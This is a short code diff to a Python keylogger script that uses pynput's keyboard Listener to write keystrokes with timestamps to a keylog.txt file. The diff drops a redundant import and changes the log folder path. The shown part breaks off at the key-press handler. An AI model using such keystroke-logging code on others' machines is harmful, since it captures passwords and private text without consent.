@@ -1,8 +1,7 @@
-import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = r"/home/user/Documents/logs/"
+log_dir = r"/home/sirius/Documents/Logs/"
 logging.basicConfig(filename = (log_dir + "keylog.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')
 
 def on_press(key):
